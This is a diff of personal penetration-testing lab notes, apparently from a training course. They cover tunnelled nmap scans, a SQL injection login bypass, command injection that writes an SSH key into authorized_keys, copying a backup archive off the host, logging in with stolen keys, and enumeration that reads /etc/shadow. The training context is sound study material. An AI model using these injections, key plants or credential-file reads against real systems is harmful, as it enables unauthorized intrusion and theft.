@@ -11,7 +11,7 @@ proxychains nmap -v -sT -Pn -T4 --script=http-enum.nse 192.168.28.100 -p 80
 firefox 127.0.0.1:12001
 http://127.0.0.1:12001/admin
 http://127.0.0.1:12001/admin/login.php
-‘ OR 1=’1
+' OR 1='1
 ' OR 1='1
 	autolaunched
 http://127.0.0.1:12001/admin/admin.php
@@ -43,7 +43,8 @@ SSH KEY UPLOAD
 * If there isn't one, > will make a new file. 
 
 ; echo "Your_Public_key" > /users/home/directory/.ssh/authorized_keys
-**** type the quotation marks directly into the webpage to avoid errors do not an copy and paste that portion**** if errors continue ; rm /users/home/directory/.ssh/authorized_keys and repeat the steps to upload the key*****
+**** type the quotation marks directly into the webpage to avoid errors do not an copy and paste that portion
+**** if errors continue ; rm /users/home/directory/.ssh/authorized_keys and repeat the steps to upload the key*****
 
 * Verify key has been uploaded successfully.
 
@@ -73,7 +74,6 @@ ls -la
 scp backup.tar.gz student@10.50.30.90:  
 	*** sends to the student home folder on linops
 	
-
 ___________________________________________________________________________________
 
 ssh -S /tmp/jump JUMP -O cancel -D 9050
@@ -102,3 +102,18 @@ proxychains nmap -v -sT -Pn -T4 --script=banner.nse 192.168.150.253 -p 3201
 	***Lands on comrade@lin ->  now create its master socket
 ___________________________________________________________________________________
 ssh -MS /tmp/T253 -i stolenkeys/.ssh/id_rsa comrade@127.0.0.1 -p 12013
+*** on box enumeration
+whoami 
+sudo -l
+id
+uname -a
+ifconfig -a
+ss -ntlp
+ss -nulp
+which tcpdump wireshark nmap telnet wget curl ping ssh
+cat /etc/shadow
+cat /etc/hosts
+cat /etc/passwd
+ls -la /tmp
+ls -la /tmp
+_____________________________________________________________________
